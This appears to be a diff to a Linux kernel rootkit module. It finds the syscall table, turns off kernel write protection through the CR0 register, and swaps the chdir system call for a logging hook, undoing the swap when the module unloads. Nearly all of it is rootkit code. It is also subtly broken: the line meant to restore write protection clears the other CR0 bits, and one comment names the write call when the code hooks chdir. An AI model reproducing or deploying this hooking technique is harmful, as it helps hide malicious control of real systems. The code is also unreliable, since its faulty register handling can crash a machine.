@@ -16,6 +16,15 @@ typedef unsigned long pointer_size_t;
 
 unsigned long **syscall_table;
 
+asmlinkage int (*original_chdir)(const char __user *path);
+
+asmlinkage int my_chdir(const char __user *path)
+{
+	printk("Hijacked chdir call\n");
+	int err = original_chdir(path);
+	return err;
+}
+
 pointer_size_t **find_syscall_table(void)
 {
 	pointer_size_t i;
@@ -27,6 +36,9 @@ pointer_size_t **find_syscall_table(void)
 	}
 	return NULL;
 }
+
+
+
 
 int rootkit_init(void)
 {
@@ -52,12 +64,27 @@ int rootkit_init(void)
 
 	printk("Syscall table at %p\n", syscall_table);
 	
+	// make writable by disabling write protect
+	write_cr0(read_cr0() & (~0x10000));
+
+	// hijack write system call
+	original_chdir = syscall_table[__NR_chdir];
+	syscall_table[__NR_chdir] = my_chdir;
+
+
+	// enable write protected
+	write_cr0(read_cr0() & 0x10000);
+
+
 	out:
 	return 0;
 }
 
 void rootkit_exit(void)
 {
+	write_cr0(read_cr0() & (~0x10000));
+	syscall_table[__NR_chdir] = original_chdir;
+	write_cr0(read_cr0() & 0x10000);
 	printk("Rootkit unloaded\n");
 }
 
